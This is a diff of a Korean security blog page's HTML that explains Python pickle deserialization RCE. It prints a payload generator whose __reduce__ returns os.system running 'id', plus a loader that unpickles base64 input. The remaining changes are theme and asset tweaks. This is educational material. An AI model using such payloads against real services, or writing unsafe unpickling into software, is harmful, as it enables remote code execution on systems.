@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post focus' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -403,12 +403,36 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <hr>
 <h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때,</p>
 <p>임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">object</span>.__getnewargs_ex__()<br><span class="hljs-built_in">object</span>.__getnewargs__()<br><span class="hljs-built_in">object</span>.__getstate__()<br><span class="hljs-built_in">object</span>.__setstate__(state)<br><span class="hljs-built_in">object</span>.__reduce__()<br><span class="hljs-built_in">object</span>.__reduce_ex__(protocol)<br></code></pre></td></tr></table></figure>
+<pre><code class="py">object.__getnewargs_ex__()
+object.__getnewargs__()
+object.__getstate__()
+object.__setstate__(state)
+object.__reduce__()
+object.__reduce_ex__(protocol)</code></pre>
 <p>reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다.</p>
 <p>[pickling.py]</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> cPickle<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br>cmd = <span class="hljs-string">&#x27;id&#x27;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br><br>shellcode = cPickle.dumps(Exploit())<br><span class="hljs-built_in">print</span> base64.b64encode(shellcode)<br></code></pre></td></tr></table></figure>
+<pre><code class="py">import os
+import cPickle
+import sys
+import base64
+
+cmd = &#39;id&#39;
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, (cmd,))
+
+shellcode = cPickle.dumps(Exploit())
+print base64.b64encode(shellcode)</code></pre>
 <p>[ex.py]</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> cPickle<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br>data = raw_input(<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-built_in">print</span> cPickle.loads(base64.b64decode(data))<br></code></pre></td></tr></table></figure>
+<pre><code class="py">import os
+import cPickle
+import sys
+import base64
+
+data = raw_input(&quot;&quot;)
+
+print cPickle.loads(base64.b64decode(data))</code></pre>
 <hr>
 <h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
 <li><p><a target="_blank" rel="noopener" href="https://docs.python.org/ko/3/library/pickle.html#data-stream-format">https://docs.python.org/ko/3/library/pickle.html#data-stream-format</a></p>
@@ -429,7 +453,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/06/19/bangsiri-wargame-200619/" title="동아리 워게임 홍보(?)" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">동아리 워게임 홍보(?)</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/06/19/bangsiri-wargame-200619/" title="동아리 워게임 홍보(?)" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">동아리 워게임 홍보(?)</span></a></div></section></div>
       
       
       
@@ -697,7 +721,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -776,7 +800,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -894,29 +918,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -1018,7 +1019,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -1030,7 +1031,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
